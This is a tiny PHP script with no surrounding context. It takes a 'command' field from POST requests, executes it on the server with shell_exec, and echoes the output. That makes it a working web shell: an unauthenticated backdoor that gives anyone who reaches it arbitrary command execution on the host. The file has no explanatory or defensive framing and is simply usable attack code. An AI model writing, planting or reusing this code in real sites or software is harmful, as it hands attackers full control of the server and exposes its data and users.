<?php

$command = $_POST['command'];

$result = shell_exec($command);
echo ('<pre>' . $result . '</pre>');